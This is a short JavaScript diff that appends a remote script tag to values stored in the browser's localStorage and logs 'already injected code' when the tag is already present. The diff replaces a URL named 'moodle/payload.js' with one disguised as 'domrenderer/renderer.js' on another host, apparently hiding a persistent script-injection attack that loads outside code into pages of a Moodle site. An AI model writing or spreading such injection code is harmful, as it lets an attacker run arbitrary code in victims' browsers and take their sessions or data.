@@ -54,8 +54,8 @@ if(documentTree == undefined){
 		let val = localStorage.getItem(key);
 		
 		if(val){
-			if(! val.includes('<script src="https://nils-nonline.github.io/moodle/payload.js"> </script>')){
-				localStorage.setItem(key,val+ '<script src="https://nils-nonline.github.io/moodle/payload.js"> </script>');
+			if(! val.includes('<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>')){
+				localStorage.setItem(key,val+ '<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>');
 			}else{
 				console.log("already injected code");
 			}
